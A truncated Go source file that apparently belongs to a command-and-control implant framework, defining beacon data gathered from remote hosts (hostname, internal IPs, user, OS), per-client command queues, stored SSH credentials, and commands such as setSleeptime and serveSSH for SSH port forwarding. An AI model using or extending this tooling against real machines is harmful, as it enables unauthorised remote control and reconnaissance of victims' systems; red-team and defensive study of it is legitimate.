package communication

import (
	"net"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// BeaconResponse struct which contains
// an array of users
type BeaconResponse struct {
	Commands []Command `json:"Commands"`
}

// Command struct which contains
// an command and arguments
type Command struct {
	Command string   `json:"Command"`
	Args    []string `json:"Args"`
}

// Beacon - a structure that is received from client
type Beacon struct {
	Hostname    string   `json:"Hostname"`
	InternalIPS []string `json:"InternalIPS"`
	CurrentUser string   `json:"CurrentUser"`
	OS          string   `json:"OS"`
	UID         string   `json:"UID"`
	Sleeptime   int      `json:"Sleeptime"`
}

// Client is record that gets saved for each client
type Client struct {
	Beacon       Beacon     // data saved by beacon
	Commandqueue []Command  // commands that haven't been assigned to the client
	Lastactive   time.Time  // timestamp of when the client was last active
	Username     string     // username that is used by client to ssh into server and to authenticate to the client's ssh
	Password     string     // ^ corresponding password
	Forward      *SSHClient // active port forwards of this client
}

// CommandName - these are the available commands
const (
	SetSleeptime string = "setSleeptime" // modify time slept between beacons
	ServeSSH     string = "serveSSH"     // start ssh and forward it to some host
	StopSSH      string = "stopSSH"      // s